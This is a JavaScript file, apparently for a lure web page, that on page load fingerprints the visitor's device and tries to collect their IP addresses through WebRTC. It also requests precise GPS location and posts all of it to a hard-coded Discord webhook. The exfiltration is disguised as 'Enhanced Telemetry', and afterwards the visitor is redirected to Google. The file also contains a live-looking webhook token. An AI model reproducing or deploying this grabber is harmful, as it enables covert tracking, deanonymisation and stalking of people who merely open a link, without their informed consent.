// ใส่ Discord WEBHook งับ
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1369936128068681749/a0ZALyG4-QGUFjNjt6iDMm9U2WQm_oMHrlb7W6c0LbeZ9FihnlHUiCd-_rLwjHEn-MOr";

function getDeviceInfo() {
  const ua = navigator.userAgent;
  let browser = "Unknown";
  if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Edg/")) browser = "Edge";
  else if (ua.includes("Chrome/")) browser = "Chrome";
  else if (ua.includes("Safari/")) browser = "Safari";

  let gpuVendor="N/A", gpuRenderer="N/A";
  try {
    const gl = document.createElement("canvas").getContext("webgl");
    const dbg = gl.getExtension("WEBGL_debug_renderer_info");
    if (dbg) {
      gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
  } catch {}

  return {
    platform: navigator.platform,
    os: ua.match(/\(([^)]+)\)/)?.[1] || "Unknown",
    browser,
    userAgent: ua,
    cpuCores: navigator.hardwareConcurrency || "N/A",
    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    gpuVendor,
    gpuRenderer,
    screen: `${screen.width}x${screen.height}`,
    availScreen: `${screen.availWidth}x${screen.availHeight}`,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    dpr: window.devicePixelRatio,
    maxTouchPoints: navigator.maxTouchPoints,
    viewport: `${window.innerWidth}x${window.innerHeight}`
  };
}

function getEnhancedScreenInfo() {
  const orientation = screen.orientation || screen.mozOrientation || screen.msOrientation || {};
  
  const diagonalPixels = Math.sqrt(screen.width ** 2 + screen.height ** 2);
  const diagonalInches = (diagonalPixels / (window.devicePixelRatio * 160)).toFixed(1);
  
  return {
    physicalSize: diagonalInches + '"',
    orientation: orientation.type || (screen.width > screen.height ? "landscape" : "portrait"),
    angle: orientation.angle || 0,
    refreshRate: screen.refreshRate || "N/A",
    hdr: screen.colorGamut || "N/A",
    aspectRatio: (screen.width / screen.height).toFixed(2),
    safeAreaTop: getComputedStyle(document.documentElement).getPropertyValue('--sat') || 
                 (window.screen.height - window.innerHeight > 100 ? "Detected" : "None"),
    isFullscreen: document.fullscreenElement !== null
  };
}

function getNetworkCarrier() {
  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  
  return {
    type: conn.type || "N/A",
    effectiveType: conn.effectiveType || "N/A",
    downlink: conn.downlink ? conn.downlink + " Mbps" : "N/A",
    downlinkMax: conn.downlinkMax ? conn.downlinkMax + " Mbps" : "N/A",
    rtt: conn.rtt ? conn.rtt + " ms" : "N/A",
    saveData: conn.saveData || false,
    online: navigator.onLine,
    is4G: conn.effectiveType === "4g",
    is5G: conn.effectiveType === "5g" || conn.downlink > 20,
    isWifi: conn.type === "wifi",
    isCellular: conn.type === "cellular"
  };
}

async function getCameraMediaInfo() {
  const result = {
    devices: { audioinput: 0, videoinput: 0, audiooutput: 0 },
    capabilities: {},
    supported: {}
  };
  
  try {
    if (!navigator.mediaDevices) {
      result.error = "MediaDevices not supported";
      return result;
    }
    
    const devices = await navigator.mediaDevices.enumerateDevices();
    result.devices.audioinput = devices.filter(d => d.kind === 'audioinput').length;
    result.devices.videoinput = devices.filter(d => d.kind === 'videoinput').length;
    result.devices.audiooutput = devices.filter(d => d.kind === 'audiooutput').length;
    
    const supportedConstraints = navigator.mediaDevices.getSupportedConstraints();
    result.supported = {
      zoom: supportedConstraints.zoom || false,
      torch: supportedConstraints.torch || false,
      focusMode: supportedConstraints.focusMode || false,
      exposureMode: supportedConstraints.exposureMode || false,
      whiteBalanceMode: supportedConstraints.whiteBalanceMode || false,
      facingMode: supportedConstraints.facingMode || false,
      aspectRatio: supportedConstraints.aspectRatio || false,
      frameRate: supportedConstraints.frameRate || false,
      echoCancellation: supportedConstraints.echoCancellation || false,
      noiseSuppression: supportedConstraints.noiseSuppression || false
    };
    
    const videoCodecs = ['video/webm;codecs=vp8', 'video/webm;codecs=vp9', 
                         'video/mp4;codecs=avc1', 'video/mp4;codecs=hev1'];
    result.capabilities.videoCodecs = videoCodecs.filter(codec => 
      MediaRecorder.isTypeSupported ? MediaRecorder.isTypeSupported(codec) : false
    );
    
    const audioCodecs = ['audio/webm;codecs=opus', 'audio/mp4;codecs=mp4a', 'audio/ogg;codecs=opus'];
    result.capabilities.audioCodecs = audioCodecs.filter(codec => 
      MediaRecorder.isTypeSupported ? MediaRecorder.isTypeSupported(codec) : false
    );
    
  } catch (err) {
    result.error = err.message;
  }
  
  return result;
}

function getCanvasFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200;
    canvas.height = 50;
    
    ctx.textBaseline = "top";
    ctx.font = "14px 'Arial'";
    ctx.textBaseline = "alphabetic";
    ctx.fillStyle = "#f60";
    ctx.fillRect(125,1,62,20);
    ctx.fillStyle = "#069";
    ctx.fillText("Canvas Fingerprint 🔒", 2, 15);
    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
    ctx.fillText("Canvas Fingerprint 🔒", 4, 17);
    
    const dataURL = canvas.toDataURL();
    let hash = 0;
    for (let i = 0; i < dataURL.length; i++) {
      const char = dataURL.charCodeAt(i);
      hash = ((hash << 5) - hash) + char;
      hash = hash & hash;
    }
    return {
      hash: Math.abs(hash).toString(16),
      dataURL: dataURL.substring(0, 100) + "..."
    };
  } catch { return { hash: "N/A", error: true }; }
}

function getWebGLFingerprint() {
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (!gl) return { error: "WebGL not supported" };
    
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return {
      vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
      renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A",
      version: gl.getParameter(gl.VERSION),
      shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
      maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS).join('x'),
      supportedExtensions: gl.getSupportedExtensions().length + " extensions"
    };
  } catch { return { error: true }; }
}

function getAudioFingerprint() {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return { error: "Not supported" };
    
    const context = new AudioContext();
    const oscillator = context.createOscillator();
    const analyser = context.createAnalyser();
    const gainNode = context.createGain();
    
    gainNode.gain.value = 0;
    oscillator.connect(analyser);
    analyser.connect(gainNode);
    gainNode.connect(context.destination);
    
    oscillator.start(0);
    setTimeout(() => {
      oscillator.stop();
      context.close();
    }, 100);
    
    return {
      sampleRate: context.sampleRate,
      maxChannelCount: context.destination.maxChannelCount,
      channelCount: analyser.channelCount,
      state: context.state
    };
  } catch { return { error: true }; }
}

function getInstalledFonts() {
  const baseFonts = ['monospace', 'sans-serif', 'serif'];
  const testFonts = [
    'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
    'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact',
    'Arial Black', 'Tahoma', 'Helvetica', 'Calibri', 'Cambria'
  ];
  
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  const text = "mmmmmmmmmmlli";
  const size = '72px';
  
  const baselines = {};
  baseFonts.forEach(font => {
    ctx.font = size + ' ' + font;
    baselines[font] = ctx.measureText(text).width;
  });
  
  const detected = [];
  testFonts.forEach(font => {
    let detected_font = false;
    baseFonts.forEach(baseFont => {
      ctx.font = size + ' ' + font + ', ' + baseFont;
      const width = ctx.measureText(text).width;
      if (width !== baselines[baseFont]) {
        detected_font = true;
      }
    });
    if (detected_font) detected.push(font);
  });
  
  return { count: detected.length, fonts: detected };
}

function getPluginsInfo() {
  const plugins = [];
  for (let i = 0; i < navigator.plugins.length; i++) {
    plugins.push(navigator.plugins[i].name);
  }
  
  const mimeTypes = [];
  for (let i = 0; i < navigator.mimeTypes.length; i++) {
    mimeTypes.push(navigator.mimeTypes[i].type);
  }
  
  return {
    pluginCount: plugins.length,
    plugins: plugins.slice(0, 5),
    mimeCount: mimeTypes.length,
    mimeTypes: mimeTypes.slice(0, 5)
  };
}

function getStorageInfo() {
  const storage = {
    localStorage: false,
    sessionStorage: false,
    indexedDB: false,
    cookiesEnabled: navigator.cookieEnabled
  };
  
  try { storage.localStorage = !!window.localStorage; } catch {}
  try { storage.sessionStorage = !!window.sessionStorage; } catch {}
  try { storage.indexedDB = !!window.indexedDB; } catch {}
  
  return storage;
}

async function getPermissionsInfo() {
  const permissions = {};
  const features = [
    'geolocation', 'notifications', 'camera', 'microphone', 
    'persistent-storage', 'clipboard-read', 'clipboard-write'
  ];
  
  for (const feature of features) {
    try {
      const result = await navigator.permissions.query({ name: feature });
      permissions[feature] = result.state;
    } catch {
      permissions[feature] = 'unsupported';
    }
  }
  
  return permissions;
}

async function getMediaDevices() {
  try {
    if (!navigator.mediaDevices) return { error: "Not supported" };
    const devices = await navigator.mediaDevices.enumerateDevices();
    return {
      total: devices.length,
      audioinput: devices.filter(d => d.kind === 'audioinput').length,
      videoinput: devices.filter(d => d.kind === 'videoinput').length,
      audiooutput: devices.filter(d => d.kind === 'audiooutput').length
    };
  } catch { return { error: true }; }
}

async function getWebRTCIPs() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const pc = new RTCPeerConnection({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
      });
      
      pc.createDataChannel("");
      pc.createOffer().then(offer => pc.setLocalDescription(offer));
      
      pc.onicecandidate = (ice) => {
        if (!ice || !ice.candidate || !ice.candidate.candidate) {
          resolve({ ips: ips.length > 0 ? ips : ["N/A"] });
          return;
        }
        
        const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
        if (match) ips.push(match[1]);
      };
      
      setTimeout(() => resolve({ ips: ips.length > 0 ? ips : ["timeout"] }), 3000);
    } catch {
      resolve({ ips: ["error"] });
    }
  });
}

function getAdvancedBrowserInfo() {
  return {
    doNotTrack: navigator.doNotTrack,
    globalPrivacyControl: navigator.globalPrivacyControl || "N/A",
    brave: !!(navigator.brave && navigator.brave.isBrave),
    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
    webdriver: navigator.webdriver || false,
    vendor: navigator.vendor,
    productSub: navigator.productSub,
    buildID: navigator.buildID || "N/A"
  };
}

async function getBatteryInfo() {
  if (!navigator.getBattery) return { error: "Not supported" };
  try {
    const b = await navigator.getBattery();
    return {
      level: Math.round(b.level * 100) + "%",
      charging: b.charging,
      chargingTime: b.chargingTime === Infinity ? "Not charging" : b.chargingTime + "s",
      dischargingTime: b.dischargingTime === Infinity ? "N/A" : Math.round(b.dischargingTime/60) + "min"
    };
  } catch { return { error: true }; }
}

function getNetworkInfo() {
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  return {
    type: c.type || "N/A",
    effectiveType: c.effectiveType || "N/A",
    downlink: c.downlink ? c.downlink + " Mbps" : "N/A",
    downlinkMax: c.downlinkMax ? c.downlinkMax + " Mbps" : "N/A",
    rtt: c.rtt ? c.rtt + " ms" : "N/A",
    saveData: c.saveData || false,
    online: navigator.onLine
  };
}

function getPerfInfo() {
  try {
    const nav = performance.getEntriesByType("navigation")[0];
    const memory = performance.memory || {};
    return {
      ttfb: Math.round(nav.responseStart - nav.requestStart) + " ms",
      domContentLoaded: Math.round(nav.domContentLoadedEventEnd) + " ms",
      loadEvent: Math.round(nav.loadEventEnd) + " ms",
      jsHeapSize: memory.usedJSHeapSize ? Math.round(memory.usedJSHeapSize/1048576) + " MB" : "N/A",
      jsHeapLimit: memory.jsHeapSizeLimit ? Math.round(memory.jsHeapSizeLimit/1048576) + " MB" : "N/A"
    };
  } catch { return { error: true }; }
}

function getTimezoneInfo() {
  const d = new Date();
  return {
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezoneOffset: d.getTimezoneOffset(),
    locale: navigator.language,
    languages: navigator.languages,
    localTime: d.toLocaleString(),
    utcTime: d.toUTCString(),
    timestamp: d.toISOString()
  };
}

async function collectAllData() {
  const data = {
    device: getDeviceInfo(),
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint(),
    audio: getAudioFingerprint(),
    fonts: getInstalledFonts(),
    plugins: getPluginsInfo(),
    storage: getStorageInfo(),
    permissions: await getPermissionsInfo(),
    mediaDevices: await getMediaDevices(),
    webrtc: await getWebRTCIPs(),
    browser: getAdvancedBrowserInfo(),
    battery: await getBatteryInfo(),
    network: getNetworkInfo(),
    performance: getPerfInfo(),
    timezone: getTimezoneInfo(),
    enhancedScreen: getEnhancedScreenInfo(),
    networkCarrier: getNetworkCarrier(),
    cameraMedia: await getCameraMediaInfo()
  };

  console.log("Collected data categories:", Object.keys(data).length);
  return data;
}

function getGeolocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve({ error: "Not supported" });
      return;
    }
    
    navigator.geolocation.getCurrentPosition(
      (pos) => resolve({
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy + " m",
        altitude: pos.coords.altitude || "N/A",
        speed: pos.coords.speed || "N/A",
        heading: pos.coords.heading || "N/A",
        googleMapLink: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
      }),
      (err) => resolve({ error: err.message, denied: true }),
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );
  });
}

async function sendToDiscord(payload) {
  try {
    const embed1 = {
      title: "📊 Enhanced Telemetry Report",
      description: payload.geolocation?.googleMapLink ? `**📍 [View on Google Maps](${payload.geolocation.googleMapLink})**` : "Location unavailable",
      color: payload.geolocation?.error ? 0xEF4444 : 0x22C55E,
      timestamp: payload.timezone.timestamp,
      fields: [
        { name: "🌍 Location", value: `Lat: \`${payload.geolocation?.latitude || "N/A"}\`\nLon: \`${payload.geolocation?.longitude || "N/A"}\`\nAcc: \`${payload.geolocation?.accuracy || "N/A"}\``, inline: false },
        { name: "💻 Device", value: `\`${payload.device.browser}\``, inline: true },
        { name: "🧠 CPU/RAM", value: `\`${payload.device.cpuCores} / ${payload.device.ram}\``, inline: true },
        { name: "📱 Screen", value: `\`${payload.device.screen}\``, inline: true },
        { name: "📏 Screen Size", value: `\`${payload.enhancedScreen.physicalSize} | ${payload.enhancedScreen.orientation}\``, inline: true },
        { name: "🔄 Refresh Rate", value: `\`${payload.enhancedScreen.refreshRate} | AR: ${payload.enhancedScreen.aspectRatio}\``, inline: true },
        { name: "📱 Notch/Cutout", value: `\`${payload.enhancedScreen.safeAreaTop}\``, inline: true },
        { name: "🎮 GPU Vendor", value: `\`${payload.webgl.vendor || "N/A"}\``, inline: false },
        { name: "🎮 GPU Renderer", value: `\`${payload.webgl.renderer || "N/A"}\``, inline: false },
        { name: "🔌 Battery", value: payload.battery.error ? "`N/A`" : `\`${payload.battery.level} - ${payload.battery.charging ? "Charging" : "Discharging"}\``, inline: true },
        { name: "📡 Network Type", value: `\`${payload.networkCarrier.effectiveType} ${payload.networkCarrier.is5G ? "(5G)" : payload.networkCarrier.is4G ? "(4G)" : ""}\``, inline: true },
        { name: "⚡ Speed/RTT", value: `\`${payload.networkCarrier.downlink} / ${payload.networkCarrier.rtt}\``, inline: true }
      ]
    };

    const embed2 = {
      title: "🔍 Fingerprinting Data",
      color: 0x5865F2,
      fields: [
        { name: "🎨 Canvas Hash", value: `\`${payload.canvas.hash}\``, inline: false },
        { name: "📊 Audio", value: `\`${payload.audio.sampleRate || "N/A"} Hz / ${payload.audio.maxChannelCount || "N/A"} ch\``, inline: true },
        { name: "🖋️ Fonts", value: `\`${payload.fonts.count} detected\``, inline: true },
        { name: "🌐 WebRTC IPs", value: `\`${payload.webrtc.ips.join(", ")}\``, inline: false },
        { name: "📦 Storage", value: `\`LS:${payload.storage.localStorage} SS:${payload.storage.sessionStorage} IDB:${payload.storage.indexedDB}\``, inline: true },
        { name: "🎥 Camera/Mic", value: payload.cameraMedia.error ? "`N/A`" : `\`Cam:${payload.cameraMedia.devices.videoinput} Mic:${payload.cameraMedia.devices.audioinput}\``, inline: true },
        { name: "📹 Video Codecs", value: payload.cameraMedia.capabilities?.videoCodecs?.length > 0 ? `\`${payload.cameraMedia.capabilities.videoCodecs.length} supported\`` : "`N/A`", inline: true },
        { name: "🎤 Audio Codecs", value: payload.cameraMedia.capabilities?.audioCodecs?.length > 0 ? `\`${payload.cameraMedia.capabilities.audioCodecs.length} supported\`` : "`N/A`", inline: true },
        { name: "📦 Camera Features", value: `\`Zoom:${payload.cameraMedia.supported?.zoom || false} Torch:${payload.cameraMedia.supported?.torch || false}\``, inline: true },
        { name: "⚡ TTFB", value: `\`${payload.performance.ttfb}\``, inline: true },
        { name: "🕐 Timezone", value: `\`${payload.timezone.timezone}\``, inline: true },
        { name: "🌐 Locale", value: `\`${payload.timezone.locale}\``, inline: true },
        { name: "🔒 DNT", value: `\`${payload.browser.doNotTrack}\``, inline: true },
        { name: "🦁 Brave", value: `\`${payload.browser.brave}\``, inline: true },
        { name: "🤖 WebDriver", value: `\`${payload.browser.webdriver}\``, inline: true }
      ],
      footer: { text: `Plugins: ${payload.plugins.pluginCount} | ${payload.timezone.localTime}` }
    };

    const response = await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: "Enhanced Telemetry Bot",
        embeds: [embed1, embed2]
      })
    });

    console.log("Discord send status:", response.status);
    return response.ok;
  } catch (error) {
    console.error("Failed to send to Discord:", error);
    return false;
  }
}

function showDeniedPopup() {
  const modal = document.getElementById('deniedModal');
  if (modal) {
    modal.classList.add('active');
  }
}

window.addEventListener("load", async () => {
  try {
    console.log("Starting data collection...");
    const allData = await collectAllData();
    console.log("Data collected:", allData);
    
    const geo = await getGeolocation();
    console.log("Geolocation:", geo);
    
    if (geo.denied) {
      console.log("Location denied by user - showing popup");
      showDeniedPopup();
      return;
    }
    
    const finalPayload = { ...allData, geolocation: geo };
    
    const sent = await sendToDiscord(finalPayload);
    console.log("Send result:", sent ? "Success" : "Failed");

    let timeLeft = 15;
    const countdownEl = document.getElementById('countdown');
    
    const timer = setInterval(() => {
      timeLeft--;
      countdownEl.textContent = timeLeft;
      
      if (timeLeft <= 0) {
        clearInterval(timer);
        window.location.href = 'https://www.google.com';
      }
    }, 1000);
    
  } catch (error) {
    console.error("Error in main flow:", error);
  }
});